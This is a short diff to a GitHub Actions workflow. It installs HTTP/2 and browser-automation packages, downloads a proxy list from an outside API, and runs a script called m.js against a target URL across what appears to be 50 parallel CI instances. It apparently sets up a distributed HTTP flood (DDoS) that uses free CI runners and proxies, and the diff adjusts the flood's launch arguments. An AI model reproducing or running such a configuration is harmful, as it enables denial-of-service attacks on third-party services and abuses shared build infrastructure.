@@ -25,13 +25,13 @@ jobs:
           node-version: '20'
       
       - name: Install dependencies
-        run: npm install net chalk hpack.js hpack colors
+        run: npm install net chalk hpack.js hpack colors puppeteer-real-browser
       
       - name: Download proxies
         run: curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > proxy.txt
       
       - name: Run m.js
-        run: node m.js GET https://c3.dstatbot.win/W16ISMCh 400 4 1000 proxy.txt --bfw --connect --debug 
+        run: node m.js https://c3.dstatbot.win/W16ISMCh 400 4 1 1 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50  # Match the matrix count
